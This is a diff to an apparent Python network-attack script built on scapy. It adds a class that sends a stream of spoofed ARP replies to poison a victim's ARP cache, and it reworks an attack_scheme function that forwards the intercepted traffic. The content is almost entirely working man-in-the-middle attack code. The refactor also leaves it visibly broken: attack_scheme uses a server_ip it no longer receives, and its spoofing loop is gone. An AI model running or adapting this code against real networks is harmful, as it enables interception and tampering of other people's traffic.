@@ -4,6 +4,26 @@ import sys
 import re
 import ipaddress
 
+class ARP_Poisoning:
+    def __init__(self, iface, packet_interval, victim_mac, victim_ip, ip_to_spoof, attacker_mac, attacker_ip):
+        self.iface = iface
+        self.packet_interval = packet_interval
+        self.victim_mac = victim_mac
+        self.victim_ip = victim_ip
+        self.ip_to_spoof = ip_to_spoof
+        self.attacker_mac = attacker_mac
+        self.attacker_ip = attacker_ip
+    
+    def run(self):
+        try:
+            while True:
+                # sending spoofed ARP packet to the victim (unsolicited arp reply)
+                arp_reply = scapy.Ether(src=self.attacker_mac) / scapy.ARP(op=2, psrc=self.ip_to_spoof, hwsrc=self.attacker_mac ,pdst=self.victim_ip, hwdst=self.victim_mac)
+                scapy.sendp(arp_reply, verbose=False, iface=self.iface)
+                time.sleep(self.packet_interval)
+        except KeyboardInterrupt:
+            print("Stopping ARP poisoning")
+
 def classify_address(address):
     """
     Classify a string as MAC address, IP address, or neither.
@@ -16,6 +36,7 @@ def classify_address(address):
     """
     if not isinstance(address, str):
         return "ERROR"
+
     
     # remove any whitespace
     address = address.strip()
@@ -70,32 +91,18 @@ def forward_packet(pkt, victim_ip, server_ip, victim_mac, server_mac, attacker_m
             pkt[scapy.Ether].src = attacker_mac
             scapy.sendp(pkt, verbose=False)
 
-def attack_scheme(victim_mac, server_ip, server_mac, packet_forwarding=False):
+def attack_scheme(iface, victim_ip, victim_mac, ip_to_spoof, server_mac, packet_forwarding=False):
     """
     Perform ARP poisoning attack.
     """
     
     if not server_mac:
         server_mac = get_mac_addr(server_ip)
-    attacker_mac = scapy.get_if_hwaddr(scapy.conf.iface)
 
     print(f" Victim is at {victim_mac}")
     print(f" Server {server_ip} is at {server_mac}")
 
-    try:
-        while True:
-            # sending spoofed ARP packet to the victim
-            arp_victim = scapy.ARP(op=2, psrc=server_ip, hwsrc=attacker_mac ,pdst=victim_ip, hwdst=victim_mac)
-            scapy.send(arp_victim, verbose=False)
-
-            if (packet_forwarding):
-                # sending spoofed ARP packet to the server
-                arp_server = scapy.ARP(op=2, psrc=victim_ip, hwsrc=attacker_mac, pdst=server_ip, hwdst=server_mac)
-                scapy.send(arp_server, verbose=False)
-            
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("Stopping ARP poisoning")
+    
 
     # restoring the victim's ARP cache
     arp_victim = scapy.ARP(op=2, psrc=server_ip, hwsrc=server_mac, pdst=victim_ip, hwdst=victim_mac)
